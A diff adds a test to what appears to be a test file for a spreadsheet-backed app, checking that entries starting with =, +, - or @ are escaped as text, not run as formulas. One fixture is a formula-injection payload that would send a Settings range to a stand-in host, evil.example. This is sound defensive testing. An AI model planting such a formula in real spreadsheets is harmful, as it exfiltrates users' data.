@@ -192,5 +192,26 @@ console.log("\nediting a waiting request is judged on real values");
         rows("Checkouts").find(c => c.id === "c2").status === "Active");
 }
 
+// ─── text that a spreadsheet would rather run than show ──────────────────────
+console.log("\ntext beginning with = + - or @ is stored as text, not run as a formula");
+{
+  const { post, ss, rows } = build();
+  const evil = '=IMPORTXML("https://evil.example/?d="&JOIN(",",Settings!A1:B99),"//a")';
+  post("a", "addItem", { item: item("i1", evil, false) });
+  post("a", "addItem", { item: item("i2", "+1+1", false) });
+  post("a", "addItem", { item: item("i3", "@SUM(A1:A9)", false) });
+  const hdr = ss.__sheets.Items.__data[0], col = hdr.indexOf("name");
+  const cells = ss.__sheets.Items.__data.slice(1).map(r => r[col]);
+  check("nothing lands in a cell as a live formula", cells.every(c => String(c).charAt(0) !== "="));
+  check("the guard marks it as text", cells.every(c => String(c).charAt(0) === "'"));
+  const names = rows("Items").map(i => i.name);
+  check("and the app still reads back exactly what was typed",
+        names[0] === evil && names[1] === "+1+1" && names[2] === "@SUM(A1:A9)");
+  // A leading apostrophe on ordinary text is somebody's data, not our marker.
+  post("a", "addItem", { item: item("i4", "'tis a scope", false) });
+  check("an ordinary apostrophe is left alone",
+        rows("Items").find(i => i.id === "i4").name === "'tis a scope");
+}
+
 console.log(`\n${pass} passed, ${fail} failed`);
 process.exit(fail ? 1 : 0);
